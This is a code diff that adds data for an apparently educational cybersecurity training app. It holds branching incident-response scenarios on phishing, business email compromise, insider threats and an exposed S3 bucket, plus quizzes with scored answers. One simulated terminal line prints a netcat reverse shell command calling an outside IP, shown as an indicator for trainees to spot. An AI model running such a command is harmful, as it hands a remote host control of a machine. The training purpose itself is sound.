+        situation: "47 phishing emails blocked. CEOs, CFO, and General Counsel received them. Subject: 'Urgent: DocuSign — Signature Required.' Links go to microsoftonline-secure-signin.com. No confirmed clicks yet.",
+        question: "What is your immediate first step?",
+        choices: [
+          { text: "Block the malicious domain at the email gateway and DNS level",                               tag: "Technical block",     outcome: "Smart. Prevent future delivery or access to the phishing domain immediately.",                                                        points: 30, next: "n2_blocked" },
+          { text: "Send an all-staff awareness email warning about the campaign",                                tag: "Awareness",           outcome: "Good but secondary. Block first, then warn. Don't let more emails land while you draft communications.",                              points: 15, next: "n2_blocked" },
+          { text: "Call each executive personally to confirm they haven't clicked",                             tag: "Executive check",     outcome: "Critical — but do the technical block simultaneously. Call while your team handles the block.",                                       points: 20, next: "n2_blocked" },
+          { text: "Block the domain AND call all three executives simultaneously with your team",               tag: "Block + verify",      outcome: "Excellent. Parallel action: technical blocking + executive verification covers both dimensions at once.",                             points: 40, next: "n2_blocked" }
+        ]
+      },
+      n2_blocked: {
+        timeStamp: '08:45 AM', threatLevel: 2,
+        situation: "Domain blocked. Executives notified. The CFO admits she may have entered her credentials 'just to see what it was.' She also uses the same password for her banking.",
+        question: "The CFO may have entered credentials. What is the IMMEDIATE priority?",
+        choices: [
+          { text: "Reset CFO's M365 credentials and revoke all active sessions immediately",                     tag: "Reset + revoke",      outcome: "Correct. Credential compromise means rotate credentials and kill all sessions before the attacker uses them.",                          points: 40, next: "n3_cfo_secured" },
+          { text: "Ask the CFO to change her password when she has time",                                        tag: "Self-service",        outcome: "Far too slow. The account may already be accessed while you wait.",                                                                  points:  0, next: "n3_cfo_partial" },
+          { text: "Monitor her account for suspicious activity before taking action",                            tag: "Monitor first",       outcome: "Too passive. If credentials are compromised, monitoring while the attacker operates is dangerous.",                                  points:  5, next: "n3_cfo_partial" },
+          { text: "Reset credentials, kill sessions, enable MFA, and check email forwarding rules",             tag: "Full account lockdown",outcome:"Comprehensive. BEC attackers set up inbox forwarding rules immediately after compromise. Check for those.",                           points: 45, next: "n3_cfo_secured" }
+        ]
+      },
+      n3_cfo_secured: {
+        timeStamp: '09:30 AM', threatLevel: 2,
+        situation: "CFO account secured. Audit log: no successful logins from phishing site. BUT — auto-forwarding was enabled to an external Gmail 3 weeks ago. Possible prior compromise.",
+        question: "The auto-forward rule suggests an earlier breach. What do you investigate?",
+        choices: [
+          { text: "Review all email forwarding rules across the entire organization",                            tag: "Org-wide audit",      outcome: "Critical. BEC attackers set forwarding rules on multiple accounts. Find them all.",                                                  points: 40, next: "n4_bec" },
+          { text: "Only investigate the CFO's account — that's the confirmed compromise",                       tag: "Narrow scope",        outcome: "Too narrow. The forwarding predates this campaign — there may be other compromised accounts.",                                         points: 10, next: "n4_bec" },
+          { text: "Close the forwarding rule and notify the CFO",                                               tag: "Close and notify",    outcome: "Should be done, but audit all accounts first to find the full scope.",                                                               points: 20, next: "n4_bec" },
+          { text: "Check all M365 audit logs for forwarding rule creation in the past 90 days",                 tag: "90-day lookback",     outcome: "Excellent. A 90-day lookback across the org will surface the full scope of the compromise.",                                          points: 45, next: "n4_bec" }
+        ]
+      },
+      n3_cfo_partial: {
+        timeStamp: '09:30 AM', threatLevel: 3,
+        situation: "Delayed response. Audit: successful login from Ukrainian IP to CFO's account 20 minutes ago. Attacker downloaded email archives. Auto-forwarding enabled.",
+        question: "Active account compromise confirmed. What now?",
+        choices: [
+          { text: "Force lockout, revoke all sessions, reset credentials, enable MFA now",                       tag: "Emergency lockdown",  outcome: "Correct — though late. Execute full lockdown immediately.",                                                                         points: 30, next: "n4_bec" },
+          { text: "Contact Microsoft to investigate the unauthorized access",                                    tag: "Vendor escalation",   outcome: "You can involve Microsoft, but internal action must come first. Don't wait.",                                                          points: 10, next: "n4_bec" },
+          { text: "Let the session continue while monitoring to gather intelligence",                            tag: "Monitor attacker",    outcome: "Too risky. Attacker is actively exfiltrating data. Act now.",                                                                       points:  5, next: "n4_bec" },
+          { text: "Lockout + session revocation + immediately check for other compromised accounts",             tag: "Lockout + scope",     outcome: "Good. Act fast and broaden the investigation to find other affected accounts.",                                                      points: 35, next: "n4_bec" }
+        ]
+      },
+      n4_bec: {
+        timeStamp: '11:00 AM', threatLevel: 2,
+        situation: "Audit reveals 4 finance accounts had forwarding rules set to the same Gmail domain over 6 weeks. All financial emails forwarded. Attacker knows your financial processes — prime setup for BEC wire fraud.",
+        question: "Which control BEST prevents Business Email Compromise going forward?",
+        choices: [
+          { text: "Require out-of-band verbal confirmation for all wire transfers over $5,000",                  tag: "Out-of-band verify",  outcome: "Perfect. Verbal confirmation via known phone number defeats BEC regardless of how convincing the email looks.",                        points: 40, next: "terminal_good"    },
+          { text: "Implement DMARC, DKIM, and SPF on your domain",                                              tag: "Email authentication",outcome:"Great for domain spoofing prevention, but doesn't stop compromised internal accounts from sending fraudulent emails.",                 points: 20, next: "terminal_partial" },
+          { text: "Enable MFA for all email accounts",                                                          tag: "MFA",                 outcome: "Critical and must be done — but MFA alone doesn't stop BEC if forwarding rules are already in place.",                                points: 25, next: "terminal_partial" },
+          { text: "Out-of-band verification + MFA + block external forwarding + DMARC",                         tag: "Layered BEC controls",outcome:"Comprehensive BEC prevention. Covers initial compromise, detection, and financial fraud prevention layers.",                           points: 45, next: "terminal_good"    }
+        ]
+      },
+      terminal_good:    { isTerminal: true, terminalType: 'good',    message: "Campaign neutralized. All compromised accounts secured. BEC controls deployed. No fraudulent transfers executed. Full scope identified. Email security posture significantly hardened." },
+      terminal_partial: { isTerminal: true, terminalType: 'partial', message: "Immediate threat addressed but BEC risk remains. Controls implemented but gaps in scope or prevention leave the org vulnerable to follow-on fraud attempts." },
+      terminal_bad:     { isTerminal: true, terminalType: 'bad',     message: "Significant delays allowed broad account compromise. Financial data exfiltrated. BEC fraud risk extremely high. Immediate external IR engagement recommended." }
+    }
+  },
+
+  insider_threat: {
+    id: 'insider_threat',
+    title: 'The Insider Threat',
+    roles: 'Security Analyst / HR Liaison',
+    intro: "Your DLP system flagged unusual activity: a senior developer has been copying large amounts of code and customer data to a personal USB drive over the past three weeks. HR has flagged the same employee as a potential resignation risk.",
+    nodes: {
+      start: {
+        timeStamp: 'Day 1, 09:00 AM', threatLevel: 2,
+        situation: "DLP alerts: Jake Mercer (Sr. Developer, 6 years tenure) copied 4.2GB of source code and customer PII to USB across 14 sessions. He has access to payment processing systems and the customer database.",
+        question: "What is your FIRST action?",
+        choices: [
+          { text: "Confront Jake immediately and demand he return the USB drive",                                tag: "Direct confrontation", outcome: "Premature. Tipping the suspect off before gathering evidence allows them to destroy or hide data.",                                     points:  5, next: "n2_evidence"  },
+          { text: "Quietly pull and preserve all DLP logs, access logs, and USB activity",                      tag: "Silent evidence",      outcome: "Correct. Preserve all evidence first without alerting the suspect.",                                                              points: 40, next: "n2_evidence"  },
+          { text: "Immediately revoke Jake's access to all systems",                                            tag: "Access revocation",    outcome: "Too early. Revoking access alerts Jake and you haven't looped in HR/Legal yet.",                                                  points: 10, next: "n2_tipped"    },
+          { text: "Notify HR and Legal immediately, then gather evidence together",                             tag: "HR/Legal + evidence",  outcome: "Good approach. Insider threat investigations require HR and Legal from day one.",                                                 points: 35, next: "n2_evidence"  }
+        ]
+      },
+      n2_evidence: {
+        timeStamp: 'Day 1, 02:00 PM', threatLevel: 2,
+        situation: "Evidence gathered: 4.2GB confirmed — customer PII and proprietary source code. HR confirms Jake submitted resignation this morning — effective in 2 weeks. Jake doesn't know he's under investigation.",
+        question: "Jake resigned. How do you handle his remaining access during the notice period?",
+        choices: [
+          { text: "Immediately revoke all access — resigned employees are high risk",                           tag: "Immediate revocation",  outcome: "Common approach — discuss with HR/Legal first. Abrupt revocation has legal implications.",                                          points: 20, next: "n3_monitor"   },
+          { text: "Reduce access to only what's needed for his remaining tasks + increase monitoring",          tag: "Reduced + monitor",     outcome: "Strong. Limits blast radius while maintaining normalcy. Enhanced monitoring catches new activity.",                                points: 40, next: "n3_monitor"   },
+          { text: "Keep all access the same — don't tip him off before legal is ready",                        tag: "No change",             outcome: "Too passive. Full access for 2 weeks while exfiltration is ongoing is unacceptable risk.",                                        points:  5, next: "n3_nomonitor" },
+          { text: "Have HR terminate immediately with full access revocation",                                  tag: "Immediate termination", outcome: "Valid if Legal agrees. Immediate termination with documented cause + complete access revocation.",                                points: 30, next: "n3_monitor"   }
+        ]
+      },
+      n2_tipped: {
+        timeStamp: 'Day 1, 02:00 PM', threatLevel: 3,
+        situation: "Jake was tipped off. He wiped his work laptop and resigned via email 30 minutes later. His personal devices are off-network. Evidence at risk.",
+        question: "Evidence may be destroyed. What's your priority?",
+        choices: [
+          { text: "Preserve all server-side logs, DLP records, email archives before they're overwritten",      tag: "Server-side preserve",  outcome: "Correct. Even if endpoint is wiped, server-side logs capture the activity. Preserve immediately.",                               points: 35, next: "n3_monitor"   },
+          { text: "File a police report immediately for theft of trade secrets",                                tag: "Law enforcement",       outcome: "Possible but premature without preserved evidence. Gather evidence before law enforcement.",                                       points: 15, next: "n3_monitor"   },
+          { text: "Attempt to recover deleted files from the work laptop forensically",                        tag: "Forensic recovery",     outcome: "Valuable — but server-side logs are more reliable. Do both, prioritize servers.",                                                 points: 20, next: "n3_monitor"   },
+          { text: "Preserve all logs + forensic image of work laptop + issue legal hold notice",               tag: "Full preservation",     outcome: "Excellent. Legal hold + forensic images + server logs = complete evidence package.",                                              points: 40, next: "n3_monitor"   }
+        ]
+      },
+      n3_monitor: {
+        timeStamp: 'Day 5', threatLevel: 2,
+        situation: "Enhanced monitoring active. Legal hold issued. DLP captures Jake attempting to email source code repository credentials to a personal Gmail. This is the smoking gun.",
+        question: "Jake just attempted to email credentials externally. What do you do?",
+        choices: [
+          { text: "Block the email, preserve the evidence, and brief Legal for termination",                   tag: "Block + legal",         outcome: "Correct sequence. Stop data loss, preserve evidence, hand off to Legal.",                                                         points: 40, next: "n4_final"     },
+          { text: "Let the email send so you have undeniable proof",                                           tag: "Let it send",           outcome: "Never let data exfiltration succeed as an evidence strategy. The attempt is evidence enough.",                                    points:  0, next: "n4_final"     },
+          { text: "Confront Jake now with the evidence",                                                       tag: "Direct confrontation",  outcome: "HR and Legal should lead confrontation. Security handles containment.",                                                          points: 15, next: "n4_final"     },
+          { text: "Block + preserve + brief Legal + have offboarding ready for immediate execution",           tag: "Coordinated response",  outcome: "Excellent. Coordinate technical response with immediate offboarding readiness.",                                                 points: 45, next: "n4_final"     }
+        ]
+      },
+      n3_nomonitor: {
+        timeStamp: 'Day 5', threatLevel: 3,
+        situation: "No additional monitoring. Jake copied more files daily. Today he emailed himself production database credentials and API keys. He departs in 1 week.",
+        question: "Massive data exfiltration discovered. How do you respond?",
+        choices: [
+          { text: "Immediately rotate ALL API keys, database credentials, and shared secrets",                 tag: "Credential rotation",   outcome: "Critical. Exfiltrated credentials are useless if rotated immediately.",                                                          points: 35, next: "n4_final"     },
+          { text: "Terminate Jake immediately and revoke all access",                                          tag: "Termination",           outcome: "Necessary — but rotating the credentials he already has is equally urgent.",                                                      points: 20, next: "n4_final"     },
+          { text: "Immediate termination AND immediate credential rotation across all affected systems",       tag: "Terminate + rotate",    outcome: "Correct. Both must happen simultaneously — each is equally urgent.",                                                             points: 40, next: "n4_final"     },
+          { text: "Monitor his personal email to see what he does with the credentials",                      tag: "Monitor personal",      outcome: "Illegal without proper legal authority. And passive while credentials are live is dangerous.",                                   points:  0, next: "n4_final"     }
+        ]
+      },
+      n4_final: {
+        timeStamp: 'Week 2', threatLevel: 1,
+        situation: "Jake is terminated. All credentials rotated. Now: what long-term controls address insider threats most effectively?",
+        question: "Which combination BEST mitigates insider threat risk going forward?",
+        choices: [
+          { text: "DLP + UEBA (User Entity Behavior Analytics) + least privilege + regular access reviews",   tag: "Layered insider controls", outcome: "Perfect. DLP catches data movement, UEBA detects behavioral anomalies early, least privilege limits blast radius.",             points: 40, next: "terminal_good"    },
+          { text: "Background checks on all employees",                                                       tag: "Background checks",        outcome: "Useful at hiring but doesn't address ongoing risk from trusted long-term employees.",                                           points: 10, next: "terminal_partial" },
+          { text: "Block all USB devices across the organization",                                            tag: "USB blocking",             outcome: "Addresses one channel, but determined insiders use email, cloud storage, or other methods.",                                   points: 20, next: "terminal_partial" },
+          { text: "Separation of duties + mandatory vacation + access reviews + DLP",                        tag: "Complementary controls",   outcome: "Excellent. Mandatory vacation surfaces hidden fraud; separation of duties prevents single-person abuse.",                       points: 45, next: "terminal_good"    }
+        ]
+      },
+      terminal_good:    { isTerminal: true, terminalType: 'good',    message: "Insider threat contained with evidence preserved. Termination executed cleanly with legal documentation. Credentials rotated. Long-term controls prevent recurrence." },
+      terminal_partial: { isTerminal: true, terminalType: 'partial', message: "Threat addressed but process had gaps. Some evidence risk, possible legal exposure. Controls added but coverage incomplete." },
+      terminal_bad:     { isTerminal: true, terminalType: 'bad',     message: "Significant data loss. Evidence compromised. Credentials exposed with unknown exfiltration extent. Recommend external IR and legal counsel." }
+    }
+  },
+
+  cloud_misconfiguration: {
+    id: 'cloud_misconfiguration',
+    title: 'Cloud Misconfiguration',
+    roles: 'Cloud Security Engineer / IR Lead',
+    intro: "A security researcher emailed your team: 'Your S3 bucket acme-customer-data-prod is publicly accessible. I found 52,000 customer records — names, emails, SSNs, and credit card numbers. I'm giving you 48 hours before I post this publicly.'",
+    nodes: {
+      start: {
+        timeStamp: 'Hour 0', threatLevel: 3,
+        situation: "S3 bucket confirmed public. CloudTrail: bucket has been public for 23 days. 847 GetObject requests from unknown IPs. 52,000 records exposed: PII + payment data. GDPR and PCI DSS triggered.",
+        question: "What is your ABSOLUTE FIRST action?",
+        choices: [
+          { text: "Immediately set S3 bucket to private / enable Block Public Access",                         tag: "Remediate first",      outcome: "Correct. Stop the bleeding. Every second it remains public is additional exposure.",                                              points: 35, next: "n2_secured"  },
+          { text: "Notify customers immediately before doing anything else",                                   tag: "Notify first",         outcome: "Notification is critical but stop the exposure first. Notifying before remediation leaves data accessible longer.",              points: 10, next: "n2_secured"  },
+          { text: "Delete the S3 bucket entirely",                                                            tag: "Delete bucket",        outcome: "Deleting destroys evidence and disrupts business. Block public access instead.",                                               points:  5, next: "n2_partial"  },
+          { text: "Block public access AND download CloudTrail logs before they roll over",                   tag: "Remediate + preserve", outcome: "Excellent. Block access immediately while preserving evidence of who accessed it.",                                             points: 45, next: "n2_secured"  }
+        ]
+      },
+      n2_secured: {
+        timeStamp: 'Hour 1', threatLevel: 2,
+        situation: "Bucket secured. CloudTrail: 847 GetObject requests from 12 unique IPs over 23 days. Several IPs resolve to known data broker infrastructure. The researcher sent similar emails to competitors last month.",
+        question: "The researcher threatens to publish in 48 hours. How do you handle them?",
+        choices: [
+          { text: "Engage professionally, thank them, ask for details of what they accessed",                  tag: "Responsible disclosure", outcome: "Correct. Treat this as responsible disclosure. Get details to understand scope.",                                             points: 35, next: "n3_scope"    },
+          { text: "Ignore them — they're a hacker trying to extort you",                                      tag: "Ignore",                 outcome: "Wrong. Even if motives are mixed, they have information you need about breach scope.",                                        points:  0, next: "n3_scope"    },
+          { text: "Have Legal send a cease-and-desist threatening prosecution",                               tag: "Legal threat",           outcome: "Bad. Threatening researchers who reported a valid vulnerability creates a PR disaster.",                                      points:  5, next: "n3_scope"    },
+          { text: "Engage researcher + notify Legal + begin breach notification assessment simultaneously",   tag: "Coordinated response",   outcome: "Perfect. Professional engagement + legal counsel + breach notification process all started.",                                points: 45, next: "n3_scope"    }
+        ]
+      },
+      n2_partial: {
+        timeStamp: 'Hour 1', threatLevel: 3,
+        situation: "Bucket secured but evidence handling was poor. CloudTrail shows 847 downloads. Researcher claims to have the full dataset.",
+        question: "How do you determine the full scope of what was accessed?",
+        choices: [
+          { text: "Analyze CloudTrail S3 access logs — identify all GetObject requests and source IPs",       tag: "Log analysis",          outcome: "Correct. CloudTrail provides the complete access history. Analyze every GetObject request.",                                   points: 35, next: "n3_scope"    },
+          { text: "Assume all 52,000 records were accessed by all 12 IPs",                                   tag: "Assume worst case",     outcome: "Prudent for notification, but also do the log analysis to get actual scope.",                                                  points: 20, next: "n3_scope"    },
+          { text: "Only count downloads from suspicious IPs",                                                tag: "Selective analysis",    outcome: "Incomplete. All external access should be investigated.",                                                                       points: 10, next: "n3_scope"    },
+          { text: "Engage AWS directly for forensic assistance",                                              tag: "AWS support",           outcome: "AWS can help but you have direct CloudTrail access — start there immediately.",                                                points: 15, next: "n3_scope"    }
+        ]
+      },
+      n3_scope: {
+        timeStamp: 'Hour 6', threatLevel: 2,
+        situation: "Scope confirmed: all 52,000 records accessible; at least 3,400 definitively downloaded. Payment card data included. PCI DSS breach + GDPR state privacy laws all triggered.",
+        question: "What is the GDPR notification deadline for reporting this breach to regulators?",
+        choices: [
+          { text: "72 hours from discovery",  tag: "72 hours",  outcome: "Correct. GDPR Article 33: notify the supervisory authority within 72 hours of becoming aware of the breach.", points: 40, next: "n4_notify" },
+          { text: "30 days from discovery",   tag: "30 days",   outcome: "Incorrect. 30 days is common in US state laws. GDPR is 72 hours — much faster.",                              points: 10, next: "n4_notify" },
+          { text: "60 days from discovery",   tag: "60 days",   outcome: "Incorrect. 60 days is HIPAA. GDPR requires 72 hours.",                                                        points:  5, next: "n4_notify" },
+          { text: "Immediately — same day",   tag: "Same day",  outcome: "The formal requirement is within 72 hours. Immediately is better than late, but 72hr is the legal standard.", points: 25, next: "n4_notify" }
+        ]
+      },
+      n4_notify: {
+        timeStamp: 'Hour 24', threatLevel: 1,
+        situation: "Regulators notified within 72 hours. Customer notification underway. Root cause: developer set bucket to public during a debugging session 23 days ago and never reverted it. No CSPM detected the change.",
+        question: "Which control would have PREVENTED this misconfiguration from persisting for 23 days?",
+        choices: [
+          { text: "Cloud Security Posture Management (CSPM) with real-time misconfiguration alerts",           tag: "CSPM",                  outcome: "Perfect. CSPM continuously scans for misconfigs and alerts immediately when a bucket goes public.",                              points: 45, next: "terminal_good"    },
+          { text: "Enable AWS S3 Block Public Access at the ACCOUNT level",                                   tag: "Account-level block",   outcome: "Excellent preventive control. Account-level block prevents ANY bucket from being made public.",                                  points: 45, next: "terminal_good"    },
+          { text: "Code reviews before any infrastructure changes",                                           tag: "Code review",           outcome: "Good process control but doesn't catch manual console changes made during debugging.",                                          points: 20, next: "terminal_partial" },
+          { text: "Account-level Block Public Access + CSPM alerts as compensating control",                  tag: "Defense in depth",      outcome: "Best answer. Prevention (account-level block) + detection (CSPM) = defense in depth.",                                         points: 50, next: "terminal_good"    }
+        ]
+      },
+      terminal_good:    { isTerminal: true, terminalType: 'good',    message: "Breach contained and disclosed within legal requirements. Root cause addressed. CSPM and preventive controls deployed. Customer trust impact minimized through rapid, transparent response." },
+      terminal_partial: { isTerminal: true, terminalType: 'partial', message: "Breach handled but process gaps remain. Notification timelines met. Controls added but root cause prevention incomplete. Regulatory scrutiny likely." },
+      terminal_bad:     { isTerminal: true, terminalType: 'bad',     message: "Significant handling failures. Late notification, evidence gaps, or poor researcher engagement created additional legal and reputational risk on top of the original breach." }
+    }
+  }
+};
+
+</script>
+
+<script>
+
+// ═══════════════════════════════════════════════════════
+// CYBER SIMULATIONS ENGINE  (replaces cyber-simulations.js)
+// ═══════════════════════════════════════════════════════
+const SIM_SCENARIOS = {
+  phishing: {
+    title: 'Phishing Detection',
+    icon: '🎣',
+    context: 'You are a Security Analyst at MedCorp. A user forwarded a suspicious email. Analyze the indicators and determine the correct response.',
+    steps: [
+      {
+        type: 'email',
+        fromDisplay: 'IT Support <it-support@medcorp-helpdesk.net>',
+        to: 'j.williams@medcorp.com',
+        subject: 'URGENT: Your Account Will Be Suspended in 24 Hours',
+        body: `Dear Employee,
+
+We have detected unusual login activity on your account. To prevent suspension you must verify your identity immediately.
+
+Click here to verify: http://medcorp-account-verify.ru/login
+
+You MUST complete this within 24 hours or your account will be permanently disabled.
+
+— IT Support Team, MedCorp IT Department`,
+        question: 'Which THREE indicators identify this as a phishing email?',
+        choices: [
+          { text: 'Sender domain is medcorp-helpdesk.net, not the corporate medcorp.com domain', correct: true },
+          { text: 'The verification link points to a .ru (Russia) domain, not medcorp.com',       correct: true },
+          { text: 'Urgent language and artificial deadline pressure victim to act without thinking',correct: true },
+          { text: 'The email was sent at an unusual time of day',                                  correct: false }
+        ],
+        explanation: 'Three indicators: (1) domain mismatch — medcorp-helpdesk.net ≠ medcorp.com, (2) suspicious link domain (.ru), (3) urgency/fear tactics. Always verify sender domain, hover over links before clicking, and be skeptical of any urgent account-related request.',
+        correctCount: 3
+      },
+      {
+        type: 'mcq',
+        question: 'A user already clicked the link and entered their credentials. What is your FIRST action?',
+        choices: [
+          { text: 'Send an awareness email to all staff about the campaign',                    correct: false, feedback: 'Important but not first — the compromised account needs immediate action.' },
+          { text: 'Reset the user\'s password and revoke all active sessions immediately',      correct: true,  feedback: '✓ Correct! Stop the attacker from using stolen credentials right now.' },
+          { text: 'Block the phishing domain at the email gateway and web proxy',               correct: false, feedback: 'Also necessary, but the compromised account is the more urgent priority.' },
+          { text: 'Wait to confirm attacker activity in the audit log before acting',           correct: false, feedback: 'Never wait. Compromised credentials = immediate account lockdown.' }
+        ],
+        explanation: 'When credentials are compromised: (1) Reset password, (2) Revoke all active sessions/tokens — these are simultaneous, not sequential. Then block the domain and send org-wide awareness.'
+      }
+    ]
+  },
+  incident: {
+    title: 'Incident Response',
+    icon: '🚨',
+    context: 'You are an Incident Responder at a financial institution. A server is showing signs of active compromise. Analyze the output and make the correct calls.',
+    steps: [
+      {
+        type: 'terminal',
+        lines: [
+          { cls: 'terminal-prompt',  text: 'analyst@FINBANK-SOC:~$' },
+          { cls: 'terminal-command', text: 'netstat -an | grep ESTABLISHED' },
+          { cls: 'terminal-output',  text: 'tcp  0  0  10.0.0.45:443    203.0.113.99:52341    ESTABLISHED' },
+          { cls: 'terminal-output',  text: 'tcp  0  0  10.0.0.45:443    198.51.100.77:61102   ESTABLISHED' },
+          { cls: 'terminal-warning', text: 'tcp  0  0  10.0.0.45:4444   185.220.101.55:39841  ESTABLISHED  ← SUSPICIOUS' },
+          { cls: 'terminal-prompt',  text: 'analyst@FINBANK-SOC:~$' },
+          { cls: 'terminal-command', text: 'ps aux | grep 4444' },
+          { cls: 'terminal-error',   text: 'root  4821  99.2  0.1  nc -e /bin/sh 185.220.101.55 4444' },
+          { cls: 'terminal-error',   text: '                              ↑ ACTIVE REVERSE SHELL — ROOT ACCESS' }
+        ],
+        question: 'What does the terminal output confirm?',
+        choices: [
+          { text: 'An attacker has full remote command execution via a reverse shell running as root', correct: true,  feedback: '✓ Correct. "nc -e /bin/sh" is netcat reverse shell — server calls out to attacker granting interactive root shell.' },
+          { text: 'Port 4444 is open for legitimate system monitoring',                               correct: false, feedback: 'Port 4444 is not a standard monitoring port. This process is "nc -e /bin/sh" — a reverse shell.' },
+          { text: 'The server is performing an outbound vulnerability scan',                          correct: false, feedback: 'The server is the victim. It is connecting to an external attacker IP and handing over a shell.' },
+          { text: 'Normal outbound banking application traffic',                                      correct: false, feedback: 'nc -e /bin/sh executing as root calling an external IP is never normal.' }
+        ],
+        explanation: '"nc -e /bin/sh" on port 4444 calling 185.220.101.55 = reverse shell. The compromised server connects OUT to the attacker (bypasses inbound firewall). Attacker has interactive root shell.'
+      },
+      {
+        type: 'mcq',
+        question: 'Active root reverse shell confirmed. What is the correct response sequence?',
+        choices: [
+          { text: '1. Kill the netcat process  2. Isolate server  3. Forensic image  4. Root cause analysis',   correct: true,  feedback: '✓ Correct. Kill active threat → isolate → preserve evidence → investigate.' },
+          { text: '1. Wipe and reinstall OS immediately  2. Restore from backup  3. Return to service',         correct: false, feedback: 'Wiping destroys all forensic evidence. How the attacker got in remains unknown.' },
+          { text: '1. Monitor attacker activity to gather intelligence  2. Act after 24 hours',                 correct: false, feedback: 'An attacker with root access can cause catastrophic damage. Act immediately.' },
+          { text: '1. Notify management  2. Wait for written authorization  3. Then isolate',                   correct: false, feedback: 'A live reverse shell is an active emergency. Isolate first, notify simultaneously.' }
+        ],
+        explanation: 'NIST SP 800-61 IR lifecycle: Contain (kill shell + network isolate) → Preserve evidence (disk image) → Eradicate (clean/rebuild) → Recover → Lessons Learned. Never wipe before forensic imaging.'
+      }
+    ]
+  },
+  malware: {
+    title: 'Malware Analysis',
+    icon: '🦠',
+    context: 'An accounting workstation is behaving strangely — high CPU, unusual network connections, files disappearing. Analyze the indicators to identify and respond.',
+    steps: [
+      {
+        type: 'terminal',
+        lines: [
+          { cls: 'terminal-prompt',  text: 'C:\\Users\\jsmith> tasklist /v' },
+          { cls: 'terminal-output',  text: 'svchost.exe       1284  Services  0  23,456 K   Normal' },
+          { cls: 'terminal-output',  text: 'explorer.exe      2048  Console   1  48,234 K   Normal' },
+          { cls: 'terminal-warning', text: 'svch0st.exe       3891  Console   1  97,234 K   HIGH CPU  ← TYPOSQUAT' },
+          { cls: 'terminal-error',   text: 'Outbound scan detected: 10.0.0.20, 10.0.0.31, 10.0.0.44, 10.0.0.55...' },
+          { cls: 'terminal-prompt',  text: 'C:\\Users\\jsmith> dir Documents' },
+          { cls: 'terminal-error',   text: 'ALL FILES renamed to .encrypted extension' },
+          { cls: 'terminal-warning', text: 'README_DECRYPT.txt: Pay 10 BTC to recover your files.' }
+        ],
+        question: 'Based on these indicators, what type of malware is this?',
+        choices: [
+          { text: 'Ransomware — encrypting files and actively scanning the network to spread',  correct: true,  feedback: '✓ Correct. File encryption + network scanning for lateral movement = active ransomware spreading.' },
+          { text: 'Adware — displaying ads and slowing the system',                             correct: false, feedback: 'Adware doesn\'t encrypt files or aggressively scan the network.' },
+          { text: 'Keylogger — silently recording keystrokes',                                  correct: false, feedback: 'Keyloggers are silent and low-resource. This malware is active, visible, and spreading.' },
+          { text: 'Rootkit — hiding malware from the OS',                                       correct: false, feedback: 'Rootkits are stealthy. This malware is very active and visible in the process list.' }
+        ],
+        explanation: '"svch0st.exe" (typosquatted process) is encrypting files (.encrypted extension) and scanning 10.0.0.x hosts for lateral movement. Ransom note confirms ransomware. The network scan means it\'s actively trying to spread to other systems.'
+      },
+      {
+        type: 'mcq',
+        question: 'Ransomware is actively spreading via network shares. What is the PRIORITY action?',
+        choices: [
+          { text: 'Isolate the infected workstation from the network immediately',                correct: true,  feedback: '✓ Correct. Network isolation stops lateral movement. Every second connected = more hosts potentially encrypted.' },
+          { text: 'Run antivirus to remove the ransomware',                                       correct: false, feedback: 'AV may trigger accelerated behavior and won\'t stop active encryption. Isolate first.' },
+          { text: 'Back up the encrypted files before they\'re overwritten',                      correct: false, feedback: 'Encrypted files have already been changed — you need decryption keys. Isolation stops more damage.' },
+          { text: 'Pay the ransom quickly before more files are encrypted',                       correct: false, feedback: 'Never pay as the first response. Isolate first, then check clean backups before considering any other options.' }
+        ],
+        explanation: 'Active ransomware spreading: network isolation is #1 priority — stops lateral movement immediately. Then: identify clean backups, check known decryptors, assess scope before any other action.'
+      }
+    ]
+  },
+  network: {
+    title: 'Network Security',
+    icon: '🌐',
+    context: 'You are a Network Security Analyst. The firewall is logging unusual traffic patterns. Review the logs and identify the attack and response.',
+    steps: [
+      {
+        type: 'terminal',
+        lines: [
+          { cls: 'terminal-output',  text: '═══ FIREWALL LOG EXCERPT ═══' },
+          { cls: 'terminal-output',  text: '09:41:02  SRC: 45.142.212.100  DST: 203.0.113.5:80  PACKETS: 1' },
+          { cls: 'terminal-output',  text: '09:41:02  SRC: 45.142.212.101  DST: 203.0.113.5:80  PACKETS: 1' },
+          { cls: 'terminal-output',  text: '09:41:02  SRC: 45.142.212.102  DST: 203.0.113.5:80  PACKETS: 1' },
+          { cls: 'terminal-warning', text: '... [43,217 similar entries in 60 seconds from /24 subnet] ...' },
+          { cls: 'terminal-error',   text: 'RATE: 723 req/sec  |  BANDWIDTH: 2.1 Gbps inbound' },
+          { cls: 'terminal-error',   text: 'Web server CPU: 100%  |  Response time: TIMEOUT  |  Status: DOWN' }
+        ],
+        question: 'What type of attack is shown in these firewall logs?',
+        choices: [
+          { text: 'Distributed Denial of Service (DDoS) — volumetric HTTP flood',     correct: true,  feedback: '✓ Correct. Thousands of source IPs, 2.1Gbps inbound, server at 100% CPU and down = textbook volumetric DDoS.' },
+          { text: 'Port scanning — attacker mapping network services',                 correct: false, feedback: 'Port scanning is low-volume and methodical. This is 43,000 requests in 60 seconds to one port.' },
+          { text: 'SQL injection — attacker sending malicious database queries',       correct: false, feedback: 'SQLi targets the application layer with crafted payloads. This is network-layer volumetric flooding.' },
+          { text: 'ARP poisoning — redirecting local network traffic',                 correct: false, feedback: 'ARP poisoning is a LAN Layer 2 attack. This traffic is external IPs over HTTP.' }
+        ],
+        explanation: '43,000+ requests/minute from distributed IPs causing 100% CPU and server downtime = volumetric HTTP DDoS. Key tells: distributed source IPs across a /24 subnet, 2.1Gbps, server completely unresponsive.'
+      },
+      {
+        type: 'mcq',
+        question: 'The DDoS attack is bringing down the web server. Most effective response?',
+        choices: [
+          { text: 'Block the entire 45.142.212.0/24 subnet at the perimeter firewall',           correct: false, feedback: 'Partially helpful but DDoS traffic typically comes from many different IP ranges. This won\'t stop it.' },
+          { text: 'Activate DDoS mitigation / traffic scrubbing service and enable rate limiting',correct: true,  feedback: '✓ Correct. Traffic scrubbing services (Cloudflare, AWS Shield) filter attack traffic before it reaches your network.' },
+          { text: 'Restart the web server to clear the connection queue',                         correct: false, feedback: 'Restarting doesn\'t help — the flood immediately overwhelms it again.' },
+          { text: 'Scale up web server resources (more CPU and RAM)',                             correct: false, feedback: 'Scaling helps with traffic spikes but not DDoS — the attacker can always send more traffic.' }
+        ],
+        explanation: 'DDoS mitigation services (Cloudflare, AWS Shield, Akamai) absorb and filter attack traffic upstream. Rate limiting at the edge reduces impact. Blocking individual IP ranges is ineffective for truly distributed attacks.'
+      }
+    ]
+  },
